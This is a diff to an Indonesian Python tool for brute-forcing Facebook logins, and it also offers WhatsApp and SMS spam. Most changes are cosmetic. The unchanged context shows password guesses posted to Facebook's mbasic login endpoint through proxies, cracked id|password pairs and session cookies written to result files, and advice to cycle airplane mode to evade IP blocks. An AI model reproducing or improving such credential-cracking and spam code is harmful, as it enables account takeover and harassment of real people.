@@ -304,8 +304,9 @@ def menu(my_name,my_id):
 	os.system('clear')
 	banner()
 	ip = requests.get("https://api.ipify.org").text
+	pengguna = request.get('https://api.countapi.xyz/hit/Brayen/visits').json()["nilai"]	
 	cetak(panel(f'[bold white] Terima Kasih Kepada [bold green]XyzonXD[bold white] Yang Telah Recode Script Ini, Simple Multi Brute Facebook',width=90,style=f"bold white"))
-	cetak(panel(f'[bold white][[bold green]•[/][bold white]][/] [bold white]Username : [bold green]{my_name}[/]\n[bold white][[bold green]•[/][bold white]][/] [bold white]User Idz : [bold green]{my_id}[/]\n[bold white][[bold green]•[/][bold white]][/] [bold white]User Ip  : [bold green]{ip}[/][/][bold white]\n[[bold green]•[/][bold white]][/] [bold white]Status   : [bold green]Premium ',width=90,title=f"[bold green]Infomasi",style=f"bold white"))
+	cetak(panel(f'[bold white][[bold green]•[/][bold white]][/] [bold white]Username : [bold green]{my_name}[/]\n[bold white][[bold green]•[/][bold white]][/] [bold white]User Idz : [bold green]{my_id}[/]\n[bold white][[bold green]•[/][bold white]][/] [bold white]User Ip  : [bold green]{ip}[/][/][bold white]\n[bold white][+[/][bold white]][/] [bold white]User Sc : [bold green]{pengguna}\n[[bold green]•[/][bold white]][/] [bold white]Status   : [bold green]Premium ',width=90,title=f"[bold green]Infomasi",style=f"bold white"))
 	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Crack Publick OR Friends [[bold green] ON [bold white]][/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Crack Massal [[bold green] ON [bold white]][/]\n[bold white][[bold green]03[/][bold white]][/] [bold white]Crack Username [[bold green] ON [bold white]]\n[bold white][[bold green]04[/][bold white]][/] [bold white]Crack File [[bold green] ON [bold white]]\n[bold white][[bold green]05[/][bold white]][/] [bold white]Crack Followers [[bold green] ON [bold white]]\n[bold white][[bold green]06[/][bold white]][/] [bold white]Crack Email [[bold green] ON [bold white]]\n[bold white][[bold green]07[/][bold white]][/] [bold white]Cek Result [[bold green] ON [bold white]][/]\n[bold white][[bold green]08[/][bold white]][/] [bold white]Cek Opsi Chekpoint [[bold green] ON [bold white]]\n[bold white][[bold green]09[/][bold white]][/] [bold white]Spam WhatsApp [[bold green] ON [bold white]]\n[bold white][[bold green]10[/][bold white]][/] [bold white]Spam Sms [[bold green] ON [bold white]]\n[bold white][[bold green]11[/][bold white]][/] [bold white]Report Bug [[bold green] ON [bold white]]\n[bold white][[bold red]00[/][bold white]][/] [bold red]Ganti Cookies [[bold green] ON [bold white]][/]',width=90,title=f"[bold green]List Menu",style=f"bold white"))
 	cetak(panel(f'[bold Red]Warning[bold white] Gunakan Script Ini Dengan Baik Jangan Di Salah Gunakan',width=90,title=f"[bold green]Informasi Crack",style=f"bold white"))
 	_____brayennn___xd____ = input(f' [+] Pilih Menu Crack : ')
@@ -350,7 +351,7 @@ def error():
 #-------------------[ DOA HALAL ]-----------------------#
 def doa_halal():
 	cetak(nel(f'''{H2}[{K2}+{H2}] {H2}Versi Arab Stay Halal : {K2}  لَّهُمَّ إِنِّيْ ظَلَمْتُ نَفْسِيْ ظُلْمًا كَثِيْرًا، وَلاَ يَغْفِرُ الذُّنُوْبَ إِلاَّ أَنْتَ، فَاغْفِرْ لِيْ مَغْفِرَةً مِنْ عِنْدِكَ، وَارْحَمْنِيْ، إِنَّكَ أَنْتَ الْغَفُوْرُ الرَّحِيْمُ
-{H2}[{K2}+{H2}] {H2}Versi Latin Stay Halal : {K2}Allaahumma innii zholamtu nafsi zhulman katsiiron, wa laa yaghfirudz-dzunuuba illaa anta, faghfir lii maghfirotan min 'indika, warhamni, innaka antal ghofuurur-rahim''',title=f'{P2} {H2}[ {K2}Doa Sebelum Crack {H2}]',subtitle_align='center',padding=1,style='white'))
+{H2}[{K2}+{H2}] {H2}Versi Latin Stay Halal : {K2}Allaahumma innii zholamtu nafsi zhulman katsiiron, wa laa yaghfirudz-dzunuuba illaa anta, faghfir lii maghfirotan min 'indika, warhamni, innaka antal ghofuurur-rahim''',title=f'{P2} {H2}[ {K2}Doa Sebelum Crack {H2}]',subtitle_align='center',padding=1,style='bold white'))
 #------------------[ DEFF SPAM SMS ]-------------------#
 
 agent = random.choice(
@@ -370,7 +371,7 @@ def process_data1():
 	
 def spam_sms():
 	global nomor 
-	cetak(panel(f'''   Masukan Nomor Target Yang Ingin Di Spam Contoh : +6281234567xxx''',width=90,padding=(0,8),style=f"bold white"))
+	cetak(panel(f''' Masukan Nomor Target Yang Ingin Di Spam Contoh : +6281234567xxx''',width=90,padding=(0,8),style=f"bold white"))
 	nomor = input(f" [+] Input No Hp : +62").replace("+62","")
 	if nomor == "":
 		pass
@@ -1054,7 +1055,7 @@ def result():
 			geeh = input(f'\n{P}{x}{H} [+] {x}{P}{x} {P}Select{x} : ')
 			try:geh = lol[geeh]
 			except KeyError:
-				print(' ╰─  Pilih Yang Bener Kontol ')
+				print(' [+]  Pilih Yang Bener Kontol ')
 				exit()
 			try:lin = open('CP/'+geh,'r').read().splitlines()
 			except:
@@ -1116,7 +1117,7 @@ def result():
 	elif kz in ['3','03']:
 		back()
 	else:
-		print(' ╰─  Pilih Yang Bener Kontol ')
+		print(' [+] Pilih Yang Bener Kontol ')
 		exit()
 #-------------------[ CRACK-PUBLIK-MASSAL]----------------#
 def brayen_dump():
@@ -1215,7 +1216,7 @@ def setting():
 		exit()
 	urut = []
 	urut.append(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Login Site ValidateV1 [bold green]Recommended[bold white] [/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Login Site MbasicV1 [bold green]Very Recommended[bold white] [/]\n[bold white][[bold green]03[/][bold white]][/] [bold white]Login Site FreeV1 [bold green]Recommended[bold white] ',width=45,title=f"[bold green]Metode",style=f"bold white"))
-	urut.append(panel(f'[bold white][[bold green]04[/][bold white]][/] [bold white]Login Site RegulerV1 [bold green]Recommended[bold white] [/]\n[bold white][[bold green]05[/][bold white]][/] [bold white]Login Site MbasicV2 [bold green]Very Recommended[bold white] [/]\n[bold white][[bold green]06[/][bold white]][/] [bold white]Login SiteV2 [bold green]Recommended[bold white] ',width=45,title=f"[bold green]Metode",style=f"bold white"))
+	urut.append(panel(f'[bold white][[bold green]04[/][bold white]][/] [bold white]Login Site RegulerV1 [bold green]Recommended[bold white] [/]\n[bold white][[bold green]05[/][bold white]][/] [bold white]Login Site MbasicV2 [bold green]Very Recommended[bold white] [/]\n[bold white][[bold green]06[/][bold white]][/] [bold white]Login Site FreeV2 [bold green]Recommended[bold white] ',width=45,title=f"[bold green]Metode",style=f"bold white"))
 	urut.append(panel(f'[bold white][[bold green]07[/][bold white]][/] [bold white]Login Site Async [bold green]Recommended[bold white]  ',width=45,title=f"[bold green]Metode",style=f"bold white"))
 	urut.append(panel(f'[bold white][[bold green]08[/][bold white]][/] [bold white]Login Site B-Api [bold green]Recommended[bold white]  ',width=45,title=f"[bold green]Metode",style=f"bold white"))
 	console.print(Columns(urut))
@@ -1251,10 +1252,10 @@ def setting():
 	else:
 		pwpluss.append('no')
 	
-	cetak(panel(f'      [bold white]Apakah Anda Ingin Menampilkan Aplikasi Yang Terkait Di Dalam Akun ? Y/T',width=90,title=f"[bold green]Aplikasi",style=f"bold white"))
+	cetak(panel(f'[bold white]Apakah Anda Ingin Menghapus Dosa Anda? Agar Anda Masuk Surga Y/T',width=90,title=f"[bold green]Penghapus Dosa",style=f"bold white"))
 	_brayen_ = input(' [+] Pilih : ')
 	if _brayen_ in ['']:
-		print(' [+] Pilih Yang Bener Kontol ')
+		print(' [+] Pilih Yang Benar Cok ')
 		back()
 	elif _brayen_ in ['y','Y']:
 		taplikasi.append('ya')
@@ -1278,7 +1279,7 @@ def passwrd():
 	urut.append(panel(f'        [bold green]%s [bold white]'%(okc),width=43,title=f"[bold green]OK SAVE IN",style=f"bold white"))
 	urut.append(panel(f'         [bold yellow]%s [bold white]'%(cpc),width=44,title=f"[bold yellow]CP SAVE IN",style=f"bold white"))
 	wa.print(Columns(urut))
-	cetak(panel(f'\t[bold white]On/Off Mode Pesawat Setiap 1000 Idz Agar Anda Terhindar Dari Spam Ip',width=90,title=f"[bold green]Informasi",subtitle=f"[bold green]Proses Crack",style=f"bold white"))
+	cetak(panel(f'[bold white]On/Off Mode Pesawat Setiap 1000 Idz Agar Anda Terhindar Dari Spam Ip',width=90,title=f"[bold green]Informasi",subtitle=f"[bold green]Proses Crack",style=f"bold white"))
 	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
 	des = prog.add_task('',total=len(id2))
 	with prog:
@@ -1582,8 +1583,8 @@ def reguler2(idf,pwv):
 			po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				tree = Tree(f" ")
-				tree.add(f"[bold yellow]+--->{idf}|{pw}")
-				tree.add(f"[bold yellow]+--->{ua}\n")
+				tree.add(f"[bold yellow]+---> {idf}|{pw}")
+				tree.add(f"[bold yellow]+---> {ua}\n")
 				cetak(tree)
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
@@ -1594,8 +1595,8 @@ def reguler2(idf,pwv):
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				tree = Tree(f"  ")
-				tree.add(f"[bold green]+--->{idf}|{pw}")
-				tree.add(f"[bold green]+--->{kuki}\n")
+				tree.add(f"[bold green]+---> {idf}|{pw}")
+				tree.add(f"[bold green]+---> {kuki}\n")
 				cetak(tree) 
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				cek_apk(session,coki)
